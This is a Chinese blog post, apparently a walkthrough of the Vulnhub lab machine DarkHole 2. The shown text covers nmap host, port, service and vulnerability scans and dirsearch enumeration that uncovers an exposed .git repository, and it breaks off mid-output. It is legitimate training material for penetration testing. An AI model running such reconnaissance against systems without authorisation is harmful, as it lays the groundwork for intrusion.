<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，分享技术、学习和生活的点滴记录" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录生活和学习的点滴" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，分享技术、学习和生活的点滴记录" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/logo.png" data-next-head=""/><title data-next-head="">Vulnhub - DarkHole 2</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/a685d3b506a102e3.css" as="style"/><link rel="stylesheet" href="/_next/static/css/a685d3b506a102e3.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-14467d077592c8ff.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-30a01c8f3eb2ec86.js" defer=""></script><script src="/_next/static/SOVon_ABhKhh0QeRU1c0t/_buildManifest.js" defer=""></script><script src="/_next/static/SOVon_ABhKhh0QeRU1c0t/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-[MesloLGL] font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 font-[MesloLGL] grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3xl px-3 mt-5 md:mt-15"><h1 class="font-[MesloLGL] text-xl md:text-2xl font-bold text-red-700">Vulnhub - DarkHole 2</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 font-[MesloLGL] md:text-base">SUNSET</p><p class="font-thin text-gray-600 font-[MesloLGL] ml-2 md:text-base">2025-04-02</p><p class="font-thin text-gray-600 font-[MesloLGL] ml-2 md:text-base">(Updated:<!-- -->2025-04-02<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 font-[MesloLGL] md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 font-[MesloLGL]">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 font-[MesloLGL] md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 font-[MesloLGL]">Vulnhub</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"VulnhubDarkHole 2","contentHtml":"\u003ch1\u003eDarkHole: 2\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.vulnhub.com/entry/darkhole-2,740/\"\u003ehttps://www.vulnhub.com/entry/darkhole-2,740/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e端口扫描主机发现\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e探测存活主机，\u003ccode\u003e185\u003c/code\u003e是靶机\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e\u003cspan class=\"hljs-comment\"\u003e# nmap -sP 192.168.75.0/24                 \u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-08 18:02 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.1\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00036\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:C0:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.2\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00030\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:FB:CA:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.185\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00028\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003eE:D3:\u003cspan class=\"hljs-title function_ invoke__\"\u003eAD\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.254\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00033\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:FE:CA:\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003eA (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.151\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e探测主机所有开放端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sT -min-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.185\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-08 18:03 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.185\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00040\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65533\u003c/span\u003e closed tcp \u003cspan class=\"hljs-title function_ invoke__\"\u003eports\u003c/span\u003e (conn-refused)\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp open  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp open  http\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003eE:D3:\u003cspan class=\"hljs-title function_ invoke__\"\u003eAD\u003c/span\u003e (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e探测服务版本以及系统版本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sV -sT -O -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.185\u003c/span\u003e    \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-08 18:04 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.185\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00067\u003c/span\u003es latency).\n\nPORT   STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp open  ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e8.2\u003c/span\u003ep1 Ubuntu \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003eubuntu0.\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e (Ubuntu Linux; protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp open  http    Apache httpd \u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e ((Ubuntu))\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003eE:D3:\u003cspan class=\"hljs-title function_ invoke__\"\u003eAD\u003c/span\u003e (VMware)\nWarning: OSScan results may be unreliable because we could not find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e open \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nDevice type: general purpose\nRunning: Linux \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e.X|\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e.X\nOS CPE: cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e\nOS details: Linux \u003cspan class=\"hljs-number\"\u003e4.15\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e5.8\u003c/span\u003e\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -script=vuln -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-08 \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:05 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00078\u003c/span\u003es latency).\n\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\n| http-git: \n|   \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/.git/\n|     Git repository found!\n|     Repository description: Unnamed repository; edit this file \u003cspan class=\"hljs-string\"\u003e'description'\u003c/span\u003e to name the...\n|_    Last commit message: i changed login.php file \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e more secure \n|_http-vuln-cve2017-\u003cspan class=\"hljs-number\"\u003e1001000\u003c/span\u003e: ERROR: Script execution failed (use -d to debug)\n| http-csrf: \n| Spidering limited to: maxdepth=\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e; maxpagecount=\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e; withinhost=\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e\n|   Found the following possible CSRF vulnerabilities: \n|     \n|     Path: http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/login.php\n|     Form \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e: email\n|_    Form action: \n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|       httponly flag \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e\n|   /login.php: \n|     PHPSESSID: \n|_      httponly flag \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e\n|_http-dombased-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any DOM based XSS.\n|_http-stored-xss: Couldn'\u003c/span\u003et find \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e stored XSS vulnerabilities.\n| http-enum: \n|   /login.php: Possible admin folder\n|   /.git/HEAD: Git folder\n|   /config/: Potentially interesting directory w/ listing on \u003cspan class=\"hljs-string\"\u003e'apache/2.4.41 (ubuntu)'\u003c/span\u003e\n|   /js/: Potentially interesting directory w/ listing on \u003cspan class=\"hljs-string\"\u003e'apache/2.4.41 (ubuntu)'\u003c/span\u003e\n|_  /style/: Potentially interesting directory w/ listing on \u003cspan class=\"hljs-string\"\u003e'apache/2.4.41 (ubuntu)'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e找到\u003ccode\u003e.git\u003c/code\u003e ，可能存在源码泄露\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eweb渗透\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e访问主页，存在登陆页面连接\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDarkHole%202/image76.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edirsearch -u http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e -x \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e\n//\n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  313B  - /js  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e/js/                                             \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  315B  - /.git  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e/.git/                                         \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  600B  - /.git/                                                                         \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   41B  - /.git/COMMIT_EDITMSG      \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   73B  - /.git/description                                                              \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   23B  - /.git/HEAD                \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  674B  - /.git/hooks/              \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  130B  - /.git/config                                                                   \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    1KB - /.git/index                                                                    \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  460B  - /.git/info/                                                                    \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  240B  - /.git/info/exclude        \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  485B  - /.git/logs/                                                                    \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  554B  - /.git/logs/HEAD           \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  331B  - /.git/logs/refs/heads  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e/.git/logs/refs/heads/\n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  554B  - /.git/logs/refs/heads/master                                                   \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  669B  - /.git/objects/                                                                 \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  325B  - /.git/logs/refs  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e/.git/logs/refs/                     \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   41B  - /.git/refs/heads/master                                                        \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  326B  - /.git/refs/heads  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e/.git/refs/heads/                   \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  325B  - /.git/refs/tags  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan 